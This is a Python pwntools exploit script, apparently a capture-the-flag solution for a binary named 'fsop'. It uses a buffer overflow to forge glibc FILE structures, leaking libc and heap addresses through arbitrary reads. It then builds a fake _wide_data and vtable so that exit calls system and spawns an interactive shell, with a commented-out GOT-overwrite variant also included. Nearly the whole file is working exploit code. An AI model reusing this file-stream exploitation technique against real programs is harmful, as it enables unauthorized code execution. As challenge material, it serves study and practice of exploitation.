from pwn import *

binary_name = "fsop"
exe  = ELF(binary_name, checksec=True)
libc = ELF("/usr/lib/libc.so.6", checksec=False)
context.binary = exe

ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

if args.REMOTE:
	r = connect("")
elif args.GDB:
	r = gdb.debug(f"./{binary_name}", """
		c
	""", aslr=False)
else:
	r = process(f"./{binary_name}")

def read():
	r.sendlineafter(b"> ", b"1")

def write(buf):
	r.sendlineafter(b"> ", b"2")
	r.sendafter(b"buf: ", buf)

def bof(buf):
	r.sendlineafter(b"> ", b"3")
	r.sendafter(b"buf: ", buf)

def exit():
	r.sendlineafter(b"> ", b"4")

# arbitrary read
file = flat([
	0xfbad2480,
	exe.got.read,  # _IO_read_ptr
	exe.got.read + 0x10,  # _IO_read_end
	0x0,  # _IO_read_base
	0x0,  # _IO_write_base
	0x0,  # _IO_write_ptr
	0x0,  # _IO_write_end
	0x1, # _IO_buf_base
])
payload =	b"A" * 0x18 + p64(0x1e1) + file
bof(payload)

read()
read_leak = u64(r.recv(8))
libc.address = read_leak - libc.sym.read
log.info("libc  ---> %#018x", libc.address)

# arbitrary write
# file = flat([
# 	0xfbad2480 & ~0x800 & 0xffffffff,
# 	0x0,  # _IO_read_ptr
# 	0x0,  # _IO_read_end
# 	0x0,  # _IO_read_base
# 	0x0,  # _IO_write_base
# 	exe.got.fwrite,  # _IO_write_ptr
# 	exe.got.fwrite + 0x10,  # _IO_write_end
# ])
# payload =	b"A" * 0x18 + p64(0x1e1) + file
# bof(payload)
#
# write(p64(libc.sym.system))
# write(b"/bin/sh\x00")
# r.interactive()

# code exec
# leak heap
file = flat([
	0xfbad2480,
	exe.sym.buf,  # _IO_read_ptr
	exe.sym.buf + 0x10,  # _IO_read_end
	0x0,  # _IO_read_base
	0x0,  # _IO_write_base
	0x0,  # _IO_write_ptr
	0x0,  # _IO_write_end
	0x1, # _IO_buf_base
])
payload =	b"A" * 0x18 + p64(0x1e1) + file
bof(payload)

read()
buf = u64(r.recv(8))
log.info("buf   ---> %#018x", buf)

file = flat([
	0xfbad2480 & ~0x2 & 0xffffffff | u32(b";sh\x00") << 32,
	0x0,  # _IO_read_ptr
	0x0,  # _IO_read_end
	0x0,  # _IO_read_base
	0x0,  # _IO_write_base
	0x0,  # _IO_write_ptr
	0x0,  # _IO_write_end
	0x0,  # _IO_buf_base
	0x0,  # _IO_buf_end
	0x0,  # _IO_save_base
	0x0,  # _IO_backup_base
	0x0,  # _IO_save_end
	0x0,  # _markers
	0x0,  # _chain
	0x0,  # _fileno | _flags2 << 32
	0x0,  # _old_offset
	0x0,  # _cur_column | _vtable_offset << 16 | _shortbuf << 24
	0x0,  # _lock
	0x0,  # _offset
	0x0,  # _codecvt
	buf + 0x100,  # _wide_data
	0x0,  # _freeres_list
	0x0,  # _freeres_buf
	0x0,  # __pad5
	0x1,  # _mode | _unused2[:4] << 32
	0x0,  # _unused2[4:12]
	0x0,  # _unused2[12:20]
	libc.address + 0x1d8078 - 0x18,   # vtable
])
wide_data = flat([
	0x0,  # _IO_read_ptr
	0x0,  # _IO_read_end
	0x0,  # _IO_read_base
	0x0,  # _IO_write_base
	0x1,  # _IO_write_ptr
	0x0,  # _IO_write_end
	0x0   # _IO_buf_end
]) + b"A" * 0xa8 + p64(buf - 0x68)
payload =	p64(libc.sym.system).ljust(0x18, b"A") + \
			p64(0x1e1) + \
			file + wide_data
bof(payload)

exit()

r.interactive()
